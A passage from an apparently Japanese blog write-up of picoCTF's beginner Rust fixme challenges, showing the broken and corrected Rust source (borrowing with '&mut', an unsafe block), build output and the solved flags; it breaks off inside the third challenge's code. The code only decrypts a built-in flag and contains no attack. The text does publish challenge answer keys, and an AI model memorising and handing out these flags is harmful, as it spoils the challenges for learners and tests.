+    Finished `release` profile [optimized] target(s) in 2.64s
+     Running `target/release/rust_proj`
+picoCTF{4r3_y0u_4_ru$t4c30n_n0w?}
+</pre>
+<br />
+<p>ちなみに、この次の Rust fixme 2 で与えられるファイルを見たら、Rust fixme 1 の答えが分かります。</p>
+<br />
+<p>Flag: <code>picoCTF{4r3_y0u_4_ru$t4c30n_n0w?}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="general-skills-rust-fixme-2-100-points">[General Skills]: Rust fixme 2 (100 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>The Rust saga continues? I ask you, can I borrow that, pleeeeeaaaasseeeee?
+<br /><br />
+Hint: <a href="https://doc.rust-lang.org/book/ch04-02-references-and-borrowing.html">https://doc.rust-lang.org/book/ch04-02-references-and-borrowing.html</a></p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>fixme2.tar.gz</li>
+</ul>
+<br />
+<h3 id="solution-1">Solution</h3>
+<p>Hintのままです。</p>
+<br />
+<p>ソースコードの修正をしていきます。</p>
+<p>以下がオリジナル。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="hl"><span class="lnt"> 3
+</span></span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="hl"><span class="lnt">34
+</span></span><span class="hl"><span class="lnt">35
+</span></span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">xor_cryptor</span>::<span class="n">XORCryptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_buffer</span>:<span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">borrowed_string</span>: <span class="kp">&amp;</span><span class="nb">String</span><span class="p">){</span><span class="w"> </span><span class="c1">// How do we pass values to a function that we want to change?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Key for decryption
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;CSUCKS&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Editing our borrowed value
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">borrowed_string</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="s">&#34;PARTY FOUL! Here is your flag: &#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Create decrpytion object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XORCryptor</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">is_err</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="c1">// How do we return in rust?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">xrc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Decrypt flag and print it out
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xrc</span><span class="p">.</span><span class="n">decrypt_vec</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">borrowed_string</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="o">&amp;</span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decrypted_buffer</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">borrowed_string</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Encrypted flag values
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">hex_values</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s">&#34;41&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;30&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;20&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;45&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;54&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;76&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;01&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;59&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;61&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;25&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0d&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;c4&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;60&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f2&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;12&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;a0&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;18&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;03&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;51&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;03&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;36&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;05&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f9&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;42&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;5b&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Convert the hexadecimal strings to bytes and collect them into a vector
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">encrypted_buffer</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hex_values</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|&amp;</span><span class="n">hex</span><span class="o">|</span><span class="w"> </span><span class="kt">u8</span>::<span class="n">from_str_radix</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">).</span><span class="n">unwrap</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">collect</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">party_foul</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;Using memory unsafe languages is a: &#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// Is this variable changeable?
+</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">party_foul</span><span class="p">);</span><span class="w"> </span><span class="c1">// Is this the correct way to pass a value to a function so that it can be changed?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<br />
+<br />
+<p>以下が修正後。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="hl"><span class="lnt"> 3
+</span></span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="hl"><span class="lnt">34
+</span></span><span class="hl"><span class="lnt">35
+</span></span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">xor_cryptor</span>::<span class="n">XORCryptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_buffer</span>:<span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">borrowed_string</span>: <span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="nb">String</span><span class="p">){</span><span class="w"> </span><span class="c1">// How do we pass values to a function that we want to change?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Key for decryption
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;CSUCKS&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Editing our borrowed value
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">borrowed_string</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="s">&#34;PARTY FOUL! Here is your flag: &#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Create decrpytion object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XORCryptor</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">is_err</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="c1">// How do we return in rust?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">xrc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Decrypt flag and print it out
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xrc</span><span class="p">.</span><span class="n">decrypt_vec</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">borrowed_string</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="o">&amp;</span><span class="nb">String</span>::<span class="n">from_utf8_lossy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">decrypted_buffer</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;</span><span class="si">{}</span><span class="s">&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">borrowed_string</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Encrypted flag values
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">hex_values</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s">&#34;41&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;30&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;20&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4a&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;45&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;54&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;76&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;01&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;1c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;7e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;59&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;63&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;e1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;61&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;25&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0d&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;c4&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;60&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f2&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;12&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;a0&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;18&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;03&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;51&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;03&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;36&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;05&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;0e&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;f9&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;42&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;5b&#34;</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Convert the hexadecimal strings to bytes and collect them into a vector
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">encrypted_buffer</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hex_values</span><span class="p">.</span><span class="n">iter</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|&amp;</span><span class="n">hex</span><span class="o">|</span><span class="w"> </span><span class="kt">u8</span>::<span class="n">from_str_radix</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">).</span><span class="n">unwrap</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">.</span><span class="n">collect</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line hl"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">party_foul</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;Using memory unsafe languages is a: &#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">// Is this variable changeable?
+</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">party_foul</span><span class="p">);</span><span class="w"> </span><span class="c1">// Is this the correct way to pass a value to a function so that it can be changed?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+<br />
+<p>実行結果。</p>
+<pre>
+$ cargo run --release --bin rust_proj
+   Compiling crossbeam-utils v0.8.20
+   Compiling rayon-core v1.12.1
+   Compiling either v1.13.0
+   Compiling crossbeam-epoch v0.9.18
+   Compiling crossbeam-deque v0.8.5
+   Compiling rayon v1.10.0
+   Compiling xor_cryptor v1.2.3
+   Compiling rust_proj v0.1.0 (/mnt/hgfs/Mac_Downloads/fixme2)
+    Finished `release` profile [optimized] target(s) in 2.38s
+     Running `target/release/rust_proj`
+Using memory unsafe languages is a: PARTY FOUL! Here is your flag: picoCTF{4r3_y0u_h4v1n5_fun_y31?}
+</pre>
+<br />
+<p>ちなみに、この次の Rust fixme 3 で与えられるファイルを見たら、Rust fixme 2 の答えが分かります。</p>
+<br />
+<p>Flag: <code>picoCTF{4r3_y0u_h4v1n5_fun_y31?}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="general-skills-rust-fixme-3-100-points">[General Skills]: Rust fixme 3 (100 points)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>Have you heard of Rust? Fix the syntax errors in this Rust file to print the flag!
+Download the Rust code here.
+<br /><br />
+Hint: Read the comments&hellip;darn it!</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>fixme3.tar.gz</li>
+</ul>
+<br />
+<h3 id="solution-2">Solution</h3>
+<p>3つのうち、これが一番簡単。</p>
+<br />
+<p>ソースコードの修正をしていきます。</p>
+<p>以下がオリジナル。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="hl"><span class="lnt">22
+</span></span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="hl"><span class="lnt">34
+</span></span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">xor_cryptor</span>::<span class="n">XORCryptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">encrypted_buffer</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="n">borrowed_string</span>: <span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="nb">String</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Key for decryption
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&#34;CSUCKS&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Editing our borrowed value
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="n">borrowed_string</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="s">&#34;PARTY FOUL! Here is your flag: &#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Create decryption object
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XORCryptor</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">is_err</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">xrc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Did you know you have to do &#34;unsafe operations in Rust?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="c1">// https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="c1">// Even though we have these memory safe languages, sometimes we need to do things outside of the rules
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    </span><span class="c1">// This is where unsafe rust comes in, something that is important to know about in order to keep things in perspective
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">    
+</span></span></span><span class="line hl"><span class="cl"><span class="w">    </span><span class="c1">// unsafe {
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="c1">// Decrypt the flag operations 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xrc</span><span class="p">.</span><span class="n">decrypt_vec</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Creating a pointer 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="p">.</span><span class="n">as_ptr</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">decrypted_buffer</span><span class="p">.</span><span class="n">len</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// Unsafe operation: calling an unsafe function that dereferences a raw pointer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">decrypted_slice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">std</span>::<span class="n">slice</span>::<span class="n">from_raw_parts</span><span class="p">(</span><span class="n">decrypted_ptr</span><span class="p">,</span><span class="w"> </span><span class="n">decrypted_len</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
